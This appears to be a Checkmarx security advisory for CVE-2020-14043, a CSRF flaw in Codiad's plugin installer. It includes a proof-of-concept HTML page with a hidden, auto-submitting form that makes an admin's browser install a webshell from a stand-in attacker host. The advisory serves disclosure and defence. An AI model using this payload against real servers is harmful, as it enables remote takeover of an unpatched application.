---
title: Codiad CSRF in the plugin request
date: 2020-08-20
tags:
	- "php"
	- "csrf"
	- "rce"
	- "webshell"
advisory: true
origin: https://advisory.checkmarx.net/advisory/CX-2020-4279/
cves:
	- "CVE-2020-14043"
---
## Summary
A Cross Side Request Forgery (CSRF) vulnerability was found in Codiad. The request to download a plugin from the marketplace is only available to admin users and it isn’t CSRF protected. This might cause admins to make a vulnerable request without them knowing and result in an RCE.

## Product
Codiad from v1.7.8.

## Impact
An malicious link sent to the an admin can result in a webshell on the server.

## Steps to reproduce
```
<html><head></head>
<body>
<form style="opacity: 0;" action="http://[Codiad-url]/components/market/controller.php?action=install&type=&name=Manually&repo=http://evilWebSite/webshell/webshell.zip?a=" method="GET">
<button>submit</button>
</form>
<script>document.querySelector('form').submit();</script>
</body></html>
```

### Expected result:
A webshell from ```http://evilWebSite/webshell/webshell.zip``` will be downloaded to the server.

## Remediation
There is no fixed version of Codiad.

## Credit
This issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).

## Resources
1. [Issue](https://github.com/Codiad/Codiad/issues/1122)
